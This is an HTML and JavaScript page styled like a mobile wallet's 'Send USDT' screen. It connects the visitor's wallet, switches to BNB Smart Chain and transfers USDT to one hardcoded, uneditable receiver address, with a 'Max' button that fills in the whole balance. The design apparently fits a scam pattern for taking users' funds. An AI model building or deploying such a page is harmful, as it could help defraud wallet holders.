<!DOCTYPE html>
<html>
<head>
  <title>Send USDT</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>

  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
      background: #0c0d10;
      color: white;
    }

    .header {
      text-align: center;
      padding: 15px;
      font-size: 18px;
      font-weight: 600;
      border-bottom: 1px solid #1c1d21;
    }

    .container {
      padding: 16px;
    }

    .label {
      font-size: 13px;
      color: #8a8f98;
      margin-top: 20px;
    }

    .input-box {
      margin-top: 8px;
      background: #131419;
      border: 1px solid #2a2c33;
      border-radius: 12px;
      padding: 14px;
    }

    .address {
      color: #e5e7eb;
      font-size: 14px;
      word-break: break-all;
    }

    .network {
      margin-top: 8px;
      display: inline-block;
      background: #1a1c22;
      color: #cfd3dc;
      padding: 8px 14px;
      border-radius: 20px;
      font-size: 13px;
    }

    input {
      width: 100%;
      border: none;
      outline: none;
      background: transparent;
      color: white;
      font-size: 18px;
    }

    .amount-box {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .currency {
      color: #8a8f98;
      font-size: 14px;
    }

    .max {
      color: #22c55e;
      font-size: 14px;
      cursor: pointer;
      margin-left: 10px;
    }

    .footer {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      padding: 16px;
      background: #0c0d10;
    }

    .btn {
      background: #22c55e;
      text-align: center;
      padding: 16px;
      border-radius: 30px;
      font-size: 16px;
      font-weight: 600;
      color: #0c0d10;
      cursor: pointer;
    }

    .btn:active {
      opacity: 0.85;
    }
  </style>
</head>

<body>

<div class="header">Send USDT</div>

<div class="container">

  <div class="label">Address</div>
  <div class="input-box">
    <div class="address">
      0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F
    </div>
  </div>

  <div class="label">Destination network</div>
  <div class="network">BNB Smart Chain</div>

  <div class="label">Amount</div>
  <div class="input-box amount-box">
    <input type="number" id="amount" placeholder="USDT Amount">
    <div>
      <span class="currency">USDT</span>
      <span class="max" onclick="setMax()">Max</span>
    </div>
  </div>

</div>

<div class="footer">
  <div class="btn" onclick="startFlow()">Next</div>
</div>

<script>
let provider;
let signer;

const USDT = "0x55d398326f99059fF775485246999027B3197955";
const RECEIVER = "0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F";

const ABI = [
  "function transfer(address to, uint amount) public returns (bool)",
  "function balanceOf(address owner) view returns (uint)"
];

async function connectWallet() {
  try {
    if (!window.ethereum) {
      alert("No wallet detected.\nOpen inside Trust Wallet browser or install MetaMask.");
      throw new Error("No wallet");
    }

    provider = new ethers.providers.Web3Provider(window.ethereum, "any");

    const accounts = await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();

    console.log("Connected:", accounts[0]);

    // Switch to BSC
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x38' }]
      });
    } catch (err) {
      if (err.code === 4902) {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: '0x38',
            chainName: 'BNB Smart Chain',
            nativeCurrency: {
              name: 'BNB',
              symbol: 'BNB',
              decimals: 18
            },
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com']
          }]
        });
      } else {
        throw err;
      }
    }

  } catch (err) {
    console.error(err);
    throw err;
  }
}

async function setMax() {
  try {
    await connectWallet();

    const contract = new ethers.Contract(USDT, ABI, signer);
    const address = await signer.getAddress();
    const balance = await contract.balanceOf(address);

    const formatted = ethers.utils.formatUnits(balance, 18);
    document.getElementById("amount").value = parseFloat(formatted).toFixed(2);

  } catch (err) {
    alert("Error getting balance: " + err.message);
  }
}

async function sendUSDT(amount) {
  try {
    const contract = new ethers.Contract(USDT, ABI, signer);
    const value = ethers.utils.parseUnits(amount, 18);

    const tx = await contract.transfer(RECEIVER, value);

    alert("Confirm transaction in wallet");

    await tx.wait();

    alert("Transaction successful ✅");

  } catch (err) {
    console.error(err);
    alert("Transaction failed: " + err.message);
  }
}

async function startFlow() {
  try {
    const amount = document.getElementById("amount").value;

    if (!amount || amount <= 0) {
      alert("Enter valid amount");
      return;
    }

    await connectWallet();
    await sendUSDT(amount);

  } catch (err) {
    console.error(err);
  }
}
</script>

</body>
</html>
